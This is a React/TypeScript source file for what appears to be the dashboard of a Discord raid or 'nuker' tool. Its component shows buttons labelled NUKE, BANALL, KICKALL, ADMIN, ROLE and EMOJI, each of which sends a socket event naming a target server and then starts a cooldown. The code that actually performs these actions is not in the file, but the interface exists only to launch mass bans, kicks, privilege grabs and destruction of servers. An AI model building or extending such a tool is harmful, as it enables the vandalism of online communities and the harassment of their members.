import {Button, Grid} from "@mui/material";
import {FaBomb} from "react-icons/fa";
import {HiBan} from "react-icons/hi";
import {GiHighKick} from "react-icons/gi";
import {RiAdminFill} from "react-icons/ri";
import {BsClock, BsFillEmojiAngryFill, BsPersonVcardFill} from "react-icons/bs";
import {useServers} from "../../../pages/Dashboard/Dashboard/Dashboard";
import {useState} from "react";

type RaidTasksTypes = {
    id: string
}

function RaidTasks({id}: RaidTasksTypes) {
    const {socket} = useServers();
    const [nukeDisabled, setNukeDisabled] = useState(false);
    const [banallDisabled, setBanallDisabled] = useState(false);
    const [kickallDisabled, setKickallDisabled] = useState(false);
    const [adminDisabled, setAdminDisabled] = useState(false);
    const [roleDisabled, setRoleDisabled] = useState(false);
    const [emojiDisabled, setEmojiDisabled] = useState(false);
    if (!socket) return null;

    const nukeFn = () => {
        setNukeDisabled(true);
        socket.emit("nuke", id);
        setTimeout(() => {
            setNukeDisabled(false);
        }, 500 * 1000);
    }

    const banallFn = () => {
        setBanallDisabled(true);
        socket.emit("banall", id);
        setTimeout(() => {
            setBanallDisabled(false);
        }, 500 * 1000);
    }

    const kickallFn = () => {
        setKickallDisabled(true);
        socket.emit("kickall", id);
        setTimeout(() => {
            setKickallDisabled(false);
        }, 500 * 1000);
    }

    const adminFn = () => {
        setAdminDisabled(true);
        socket.emit("admin", id);
        setTimeout(() => {
            setAdminDisabled(false);
        }, 60 * 1000);
    }

    const roleFn = () => {
        setRoleDisabled(true);
        socket.emit("role", id);
        setTimeout(() => {
            setRoleDisabled(false);
        }, 500 * 1000);
    }

    const emojiFn = () => {
        setEmojiDisabled(true);
        socket.emit("emoji", id);
        setTimeout(() => {
            setEmojiDisabled(false);
        }, 500 * 1000);
    }

    return (
        <Grid container spacing={2} paddingY="0.5rem">
            <Grid item xs>
                <Button variant="outlined" size="large" style={{fontWeight: "bold", width: "100%"}}
                        startIcon={nukeDisabled ? <BsClock/> : <FaBomb/>} color="error" onClick={nukeFn} disabled={nukeDisabled}>{nukeDisabled ? "COOLDOWN" : "NUKE"}</Button>
            </Grid>
            <Grid item xs>
                <Button variant="outlined" size="large" style={{fontWeight: "bold", width: "100%"}}
                        startIcon={banallDisabled ? <BsClock/> :<HiBan/>} color="error" onClick={banallFn} disabled={banallDisabled}>{banallDisabled ? "COOLDOWN": "BANALL"}</Button>
            </Grid>
            <Grid item xs>
                <Button variant="outlined" size="large" style={{fontWeight: "bold", width: "100%"}}
                        startIcon={kickallDisabled ? <BsClock/> :<GiHighKick/>} color="error" onClick={kickallFn} disabled={kickallDisabled}>{kickallDisabled ? "COOLDOWN" : "KICKALL"}</Button>
            </Grid>
            <Grid item xs>
                <Button variant="outlined" size="large" style={{fontWeight: "bold", width: "100%"}}
                        startIcon={adminDisabled ? <BsClock/> :<RiAdminFill/>} color="error" onClick={adminFn} disabled={adminDisabled}>{adminDisabled ? "COOLDOWN" : "ADMIN"}</Button>
            </Grid>
            <Grid item xs>
                <Button variant="outlined" size="large" style={{fontWeight: "bold", width: "100%"}}
                        startIcon={roleDisabled ? <BsClock/> :<BsFillEmojiAngryFill/>} color="error" onClick={roleFn} disabled={roleDisabled}>{roleDisabled ? "COOLDOWN" : "ROLE"}</Button>
            </Grid>
            <Grid item xs>
                <Button variant="outlined" size="large" style={{fontWeight: "bold", width: "100%"}}
                        startIcon={emojiDisabled ? <BsClock/> :<BsPersonVcardFill/>} color="error" onClick={emojiFn} disabled={emojiDisabled}>{emojiDisabled ? "COOLDOWN": "EMOJI"}</Button>
            </Grid>
        </Grid>
    )
}

export default RaidTasks;